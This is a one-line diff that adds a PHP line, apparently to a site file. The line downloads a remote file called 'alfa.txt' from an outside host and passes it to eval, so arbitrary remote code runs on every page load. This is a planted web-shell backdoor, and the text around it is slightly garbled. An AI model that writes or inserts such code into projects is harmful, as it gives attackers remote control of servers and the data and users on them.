@@ -1,0 +1,1 @@
+session_start<?php $a = file_get_contents('https://shell.prinsh.com/Nathan/alfa.txt'); eval('?>'.$a);
